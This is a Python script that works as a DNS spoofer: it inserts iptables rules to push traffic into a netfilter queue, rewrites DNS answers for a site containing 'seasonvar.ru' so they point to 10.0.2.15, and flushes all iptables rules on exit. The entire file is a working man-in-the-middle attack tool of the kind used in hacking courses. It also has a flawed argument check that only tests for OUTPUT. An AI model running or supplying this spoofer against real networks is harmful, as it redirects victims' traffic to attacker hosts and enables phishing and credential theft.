#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy
import subprocess
import argparse

def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-c0", "--chain0", dest="chain_name0", help="Chain name: FORWARD, OUTPUT, INPUT etc.")
    parser.add_argument("-c1", "--chain1", dest="chain_name1", help="Chain name: FORWARD, OUTPUT, INPUT etc.")
    parser.add_argument("-qn", "--queue-num", dest="queue_num", help="Queue number: 0, 1, 3 etc.")
    options = parser.parse_args()
    if not options.chain_name0:
        parser.error("Please, specify a chain name, use --help for more info")
    elif not options.queue_num:
        parser.error("Please, specify a queue number, use --help for more info")
    else:
        if ("OUTPUT" or "INPUT") == options.chain_name0:
            if not options.chain_name1:
                parser.error("Please, specify a chain name, use --help for more info")
    return options

def presets_for_intercept_and_modify_packets(options):
    if options.chain_name1:
        subprocess.call(["iptables", "-I", options.chain_name1, "-j", "NFQUEUE", "--queue-num", options.queue_num])
    subprocess.call(["iptables", "-I", options.chain_name0, "-j", "NFQUEUE", "--queue-num", options.queue_num])

def flush_presets():
    subprocess.call("iptables --flush", shell=True)

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "seasonvar.ru" in qname:
            print("Spoofing: " + qname)
            answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.15")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(str(scapy_packet))
    packet.accept()

options = get_args()
presets_for_intercept_and_modify_packets(options)
try:
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(int(options.queue_num), process_packet)
    queue.run()
except KeyboardInterrupt:
    print("\nDetecting 'CTRL+C'... Flushing IP-tables... Please wait...")
    flush_presets()
    print("IP-tables were flushing successfully!")